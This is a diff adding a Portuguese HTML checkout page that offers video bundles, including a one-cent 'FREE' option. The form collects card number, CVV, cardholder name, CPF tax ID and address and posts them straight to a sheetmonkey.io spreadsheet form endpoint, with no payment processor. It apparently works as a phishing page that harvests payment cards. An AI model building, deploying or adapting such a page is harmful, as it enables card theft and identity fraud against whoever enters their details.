@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, inicial-scale=1.0">
+    <title>Pagamento</title>
+    <link rel="icon" type="image/x-icon" href="https://images.getpng.net/uploads/preview/money-cash-coins-vector-icon-design-72-1151655330368d7g4ggssz8.webp">
+    <style>
+        body{
+            color: white;
+            font-family: Arial, Helvetica, sans-serif;
+            background-image: linear-gradient(to right, rgb(20, 147, 220), rgb(17, 54, 71));
+        }
+        .box{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%,-50%);
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 15px;
+        }
+        fieldset{
+            border: 3px solid dodgerblue;
+        }
+        legend{
+            border: 1px solid dodgerblue;
+            padding: 10px;
+            text-align: center;
+            background-color: dodgerblue;
+            border-radius: 5px;
+            color: white;
+        }
+        .inputUser{
+            background: none;
+            border: none;
+            border-bottom: 1px solid white;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            width: 100%;
+            letter-spacing: 1px;
+        }
+        .inputUser60{
+            background: none;
+            border: none;
+            border-bottom: 1px solid white;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            width: 63%;
+            letter-spacing: 1px;
+        }
+        .inputUser30{
+            background: none;
+            border: none;
+            border-bottom: 1px solid white;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            width: 30px;
+            letter-spacing: 1px;
+        }
+        .selectBox{
+            border: none;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 15px;
+            outline: none;
+            text-align: center;
+        }
+        .labelPlan{
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 20px;
+            font-style: italic;
+        }
+        #submit{
+            width: 100%;
+            padding: 15px;
+            background-image: linear-gradient(to right, rgb(20, 147, 220), rgb(140, 0, 255));
+            border: none;
+            border-radius: 15px;
+            font-size: 20px;
+            color: white;
+            cursor: pointer;
+        }
+        #submit:hover{
+            background-image: linear-gradient(to right, rgb(20, 147, 180), rgb(140, 0, 220));
+        }
+    </style>
+    </head>
+    <body>
+        <br>
+        <div class="box">
+            <form action="https://api.sheetmonkey.io/form/xA7J7B2F2zsYg8xriLAazb" method="post">
+<fieldset>
+    <legend><b>Finalizar Compra</b></legend>
+        <br>
+        <select name="valor" id="valor" class="selectBox" required>
+            <option value="">Escolha o produto</option>
+            <option value="1">+200 Vídeos por 9,99</option>
+            <option value="2"><b>FREE</b> - 5 Vídeos por 0,01</option>
+        </select>
+        <br><br>
+        <p><b>Dados de Pagamento</b></p>
+        <div class="inputBox">
+            <input type="text" name="cc" id="cc" class="inputUser60" placeholder="Número do Cartão" minlength="16" maxlength="16" required>
+            <input type="text" name="cvv" id="cvv" class="inputUser30" placeholder="CVV" minlength="3" maxlength="3" pattern="[0-9]+" required>
+        </div>
+        <br>
+        <div class="inputBox">
+            <input type="text" name="titular" id="titular" class="inputUser" placeholder="Titular do Cartão" required>
+        </div>
+        <br>
+        <div class="inputBox">
+            <input type="text" name="cpf" id="cpf" class="inputUser" placeholder="CPF do Titular" minlength="11" maxlength="11" required>
+        </div>
+        <br>
+        <select name="bandeira" id="bandeira" class="selectBox" required>
+            <option value="">Escolha a bandeira</option>
+            <option value="visa">VISA</option>
+            <option value="mastercard">MASTERCARD</option>
+        </select>
+        <br><br><br>
+        <div>
+            <input type="text" name="endereco" id="endereco" class="inputUser60" placeholder="Endereço" required>
+            <input type="text" name="numero" id="numero" class="inputUser30" placeholder="Nº" required>        
+        </div>
+        <br>
+        <div>
+            <input type="text" name="cidade" id="cidade" class="inputUser60" placeholder="Cidade" required>
+            <label for="estado"><b>UF</b></label>
+            <select name="estado" id="estado" class="selectBox" required>
+                <option value="">--</option>
+                <option value="AC">AC</option>
+                <option value="AL">AL</option>
+                <option value="AP">AP</option>
+                <option value="AM">AM</option>
+                <option value="BA">BA</option>
+                <option value="CE">CE</option>
+                <option value="DF">DF</option>
+                <option value="ES">ES</option>
+                <option value="GO">GO</option>
+                <option value="MA">MA</option>
+                <option value="MT">MT</option>
+                <option value="MS">MS</option>
+                <option value="MG">MG</option>
+                <option value="PA">PA</option>
+                <option value="PB">PB</option>
+                <option value="PR">PR</option>
+                <option value="PE">PE</option>
+                <option value="PI">PI</option>
+                <option value="RJ">RJ</option>
+                <option value="RN">RN</option>
+                <option value="RO">RO</option>
+                <option value="RR">RR</option>
+                <option value="RS">RS</option>
+                <option value="SC">SC</option>
+                <option value="SE">SE</option>
+                <option value="SP">SP</option>
+                <option value="TO">TO</option>
+            </select>
+        </div>
+        <br>
+</fieldset>
+<input type="submit" value="Confirmar Compra" id="submit">
+            </form>
+        </div>
+        <br>
+    </body>
+</html>
